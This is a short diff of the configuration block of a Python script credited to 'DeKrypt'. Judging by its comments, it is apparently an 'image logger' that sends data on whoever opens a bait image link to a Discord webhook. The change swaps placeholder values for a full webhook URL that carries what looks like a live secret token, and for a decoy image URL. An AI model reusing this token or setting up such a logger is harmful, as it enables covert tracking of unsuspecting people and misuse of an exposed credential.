@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335246405580619818/bD0Us64Ck36I4l1GtoAmG9ERWDjZZR2pV2zmVSgH1a-1NStkMDFQAcCuOxr5Mz-xmJ4W",
+    "image": "https://feministing.com/wp-content/uploads/2015/09/IMG_0103-e1442533995711.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
